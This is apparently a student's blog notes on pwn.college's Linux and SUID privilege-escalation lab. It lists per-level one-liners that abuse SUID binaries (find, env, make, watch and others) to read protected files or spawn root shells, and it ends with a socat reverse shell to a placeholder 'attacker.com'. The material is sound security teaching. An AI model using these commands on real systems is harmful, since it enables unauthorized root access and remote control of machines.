---
title: "PwnCollege_Note"
description: I will record some knowledge that I didn't know
date: 2022-10-29
image: 
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - Pwn.college
    - ForeignCourse

---

# ASU CSE 365

## Program Misuse

### Program Interaction:Linux Command Line

**Learning the command line**

1. [Bandit](https://overthewire.org/wargames/bandit/)

![](img/pwn_college/lesson/filesystem.png)

**env:** Environment variables are a set of Key/Value pairs pased into every process when is is launched.

**files:** there're many different types of files.

> `-` is a **regular file**
>
> `d` is a **directory**
>
> `l` is a **symbolic link**(point to another file or directory)
>
> `p` is a **named pipe**(FIFO)
>
> `c` is a **character device file**(backed by a hardware device that receives and produces data stream)
>
> `b` is a **block device file**(backed by a hardware device that stores and loads blocks of data)
>
> `s` is a **unix socket**(essentially a local network connection encapsulated in a file)

**Symbolic/soft links** created by `ln -s`(-s stands for symbolic), it likes a pointer

**Hard links**: it copys the original file. If the original file is deleted, the links won't be deleted, and all the hard links can update the same time.

**pipes**

```shell
echo echo hi		#echo hi
echo echo hi | bash	#hi
```

**Input and output redirection**

`<in_file、>outfile、>>out_file、2>error_file、2>>error_file`

### Program Misuse:Privilege Escalation



### Program Misuse:Mitigations

### babysuid challenge

**init:** we can use the Desktop or the Workspace(then change to the terminal) to operate.

**suid:** Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then **when the user executes the file, the file will be executed as the  file owner**, once the file is executed, the identity switch disappears.    



level 1-6: there're some simple programs that can directly read the flag：**cat, more, less, tail, head, sort**

level 7-9: there're some tools  ----> over-privileged **editors**：**vim, emacs, nano**

> emacs points to emacs-gtk by default, it will try to open if there's a graphical interface. But gtk can't setuid, so we can use the `-nw` to forces the graphics window not to pop up.

![](img/pwn_college/level8/image-20221030103804124.png)

**output**

level 10：**rev**---> Used to output each line of a file in reverse order of characters, that is, the first character is last and the last character is first.

level 11: **od**---> Octal, decimal, hex, ASCII dump

```shell
-b:octal		-x -h:hex
-c:ASCII		-d:Decimal(ten)
```

level 12: **hd**---> hexdump, mainly used to view the **hexadecimal encoding** of **Binary files**.

level 13: **xxd**---> Convert any file to **hexadecimal** or binary(-b) form

level 14: **base32**---> `echo 'some-base32-codings' | base32 -d` can decode the base32 coding

```
'ORUGS4ZANFZSA43PNVSSA5DFPB2CASJAO5QW45BAORXSAZLOMNXWIZIK'
```

level 15: **base64**---> decode form same as the base32

```
'cHduLmNvbGxlZ2V7NGxNTU1ILXJFUTdBZHZvNjVzNDEyV0p5Y1ZNLlFYM1VUTXNVRE40WXpXfQo='
```

level 16: **split**---> split the file to the 'xaa' file default(1000row to split).

```shell
split [-b byte][-C ][-][-l rowcount][the file to split][the prefix of the output_file][-a suffix_len]
```

**different archieve format**

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.

level 17: **gzip**

```shell
gzip -f file_name -t		(-d decompress)
# -f:--force Forcibly compressed files		-t:--test Test whether the compressed file is correct.
```

level 18: **bzip2**

```shell
bzip2 -c file_name | bzip2 -d
#-c:results are sent to standard output.
#-d:perform the decompression
```

level 19: **zip**

```shell
zip flag.zip flag #flag --> flag.zip
cat flag.zip #you can see the flag
```

level 20: **tar**

```shell
tar -cf flag.tar.gz flag  	#(-c:create new backup file -f:specify the backup file)
cat flag.tar.gz
```

level 21: **ar** ---> to create or modify a backup file

```shell
ar rv flag.back flag#-r:The file is inserted into the backup file	v:show the detail information
cat flag.back
```

level 22: **cpio**--->used to backup file

```shell
cpio -o	回车	#-o Create the archive (run in copy-out mode)
flag
ctrl + D得到flag
```

level 23: **genisoimage**---> used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.

the file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.

```shell
genisoimage -sort flag
#-sort:to re-ordering the contents of the ISO
```

**execute other commands**

It can be used to break out from restricted environments by spawning an interactive system shell

level 24: **env**--->show environment variables that already exists in the system and executes instructions in the defined environment

```shell
env /bin/sh -p #getshell
#-p:/bin/sh either became bash or stayed dash which got an additional flag -p mimicking bash's behaviour, bash requires the -p flag to not drop setuid privilege.
```

level 25: **find**--->used to find files in the specified directory

```shell
find . -exec /bin/sh -p \;
```

`exec command in Linux is used to execute a command from the bash itself. This command does not create a new process it just replaces the bash with the command to be executed. If the exec command is successful, it does not return to the calling process.`

level 26: **make**---> compile and install tools, manage project compilation issues

```shell
make -s --eval=$'x:\n\t-'"/bin/sh -p"
#-s:--silent don't echo recipes		--eval=STRING:evaluate STRING as a makefile statement
```

level 27: **nice**

```shell
nice /bin/sh -p
```

> **Usage: nice [OPTION] [COMMAND [ARG]...]**
> Run COMMAND with an adjusted niceness, which affects process scheduling.With no COMMAND, print the current niceness.  Niceness values range from -20 (most favorable to the process) to 19 (least favorable to the process).

level 28: **timeout**---> start COMMAND, and kill it if still running after DURATION.

**Usage: timeout [OPTION] DURATION COMMAND [ARG]**

```shell
timeout 7d /bin/sh -p
```

level 29: **stdbuf**---> modify the buffer mode and size of the standard stream

> `-i, --input=MODE`	adjust standard input stream buffering
>
> `-o, --output=MODE`	adjust standard output stream buffering
>
> `-e, --error=MODE`	adjust standard error stream buffering

- If MODE is `L` the corresponding stream will be line buffered.This option is invalid with standard input.


- If MODE is `0` the corresponding stream will be unbuffered.

```shell
stdbuf -i0 /bin/sh -p
```

level 30: **setarch**--->change reported **architecture** in new program **environment** and set personality flags 

```shell
setarch $(arch) /bin/sh -p #arch can set to the i386
```

level 31: **watch**---> listen by timing the output of other commands to a terminal, repeat the command every 2 seconds

Usage: `watch [options] command`

```shell
watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
#-x, --exec		pass command to exec instead of "sh -c"
#-c, --color	interpret ANSI color and style sequences
```

 `exec 1>&0`：This redirects standard output to standard input, because when a  terminal is opened by default, 0,1 and 2 all point to the same  location, which is the current terminal. So this statement restarts  standard output. At this point, execute the command we can see the output

`reset`：Sets the status of the terminal, we can use it to return the terminal to its original state

`sh [parameter] command`

```shell
-c:command to read from a string
-i:realize interaction scripts
-n:do a syntax check
-x:implement detailed statement of tracking
```

level 32: **socat**

- It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

  ```shell
  socat -u "file:$TheFileToRead_flag" - #can get the flag
  #-u unidirectional mode (left to right)
  ```

- Limited SUID: we can run **socat file:`tty`,raw,echo=0 tcp-listen:12345** on the attacker box to receive the shell

  tty：Teletype, A terminal device consisting of a virtual console, serial port, and pseudo-terminal devices

  ```shell
  RHOST=attacker.com
  RPORT=12345
  socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
  #I didn't succed to get the shell(cry...)
  ```

  
